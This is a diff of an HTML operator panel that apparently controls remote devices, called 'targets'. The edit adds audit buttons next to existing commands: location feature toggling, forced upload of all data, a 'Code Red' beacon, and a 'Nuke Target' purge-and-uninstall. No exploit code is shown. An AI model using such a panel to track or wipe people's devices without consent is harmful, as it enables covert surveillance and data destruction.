@@ -293,11 +293,12 @@
 
             <h2>Maintenance</h2>
             <div class="card">
-                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Burst Mode (Stay Ready)</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('STAY_READY')">?</button><input type="number" id="val-burst" placeholder="Mins (e.g. 15)"><button class="btn" onclick="sendCmd('STAY_READY')">Activate</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Work Cycle</label><div class="input-wrap"><button class="btn-status" onclick="auditCmd('SET_INTERVAL')">?</button><input type="number" id="val-work" placeholder="Mins (Min 15)"><button class="btn" onclick="sendCmd('SET_INTERVAL')">Set</button></div></div>
                 <div class="cmd-row">
                     <label class="cmd-label">Feature Control</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('TOGGLE_FEATURE')">?</button>
                         <input type="text" id="tog-feat" placeholder="Feature (e.g. location)">
                         <select id="tog-state" style="background:#000; color:var(--primary); border:1px solid var(--surface-light);">
                             <option value="on">ON</option>
@@ -307,7 +308,10 @@
                         <button class="btn" onclick="sendCmd('TOGGLE_FEATURE')">Set</button>
                     </div>
                 </div>
-                <button class="btn" style="width:100%" onclick="sendCmd('FORCE_UPLOAD', 'ALL')">Emergency Cloud Sync (ALL)</button>
+                <div class="input-wrap" style="margin-top:10px;">
+                    <button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
+                    <button class="btn" style="flex:1" onclick="sendCmd('FORCE_UPLOAD', 'ALL')">Emergency Cloud Sync (ALL)</button>
+                </div>
             </div>
 
             <h2 style="background: var(--danger)">Crisis Management</h2>
@@ -315,15 +319,24 @@
                 <div class="cmd-row">
                     <label class="cmd-label">Code Red (Beacon)</label>
                     <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('CODERED')">?</button>
                         <input type="text" id="cr-code" value="0" placeholder="Codes" style="width:60px">
                         <input type="number" id="cr-dur" value="15" placeholder="Mins">
                         <input type="number" id="cr-freq" value="30" placeholder="Freq(s)">
                         <button class="btn danger" onclick="sendCmd('CODERED')">Trigger</button>
                     </div>
                 </div>
-                <div class="cmd-grid" style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
-                    <button class="btn danger" onclick="sendCmd('STOP_BEACON')">Dark Mode</button>
-                    <button class="btn danger" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
+                <div class="cmd-row">
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
+                        <button class="btn danger" style="flex:1" onclick="sendCmd('STOP_BEACON')">Dark Mode (Stop Beacon)</button>
+                    </div>
+                </div>
+                <div class="cmd-row" style="margin-top:10px;">
+                    <div class="input-wrap">
+                        <button class="btn-status" onclick="auditCmd('NUKE')">?</button>
+                        <button class="btn danger" style="flex:1" onclick="if(confirm('PURGE DATA & UNINSTALL?')) sendCmd('NUKE')">Nuke Target</button>
+                    </div>
                 </div>
             </div>
         </div>
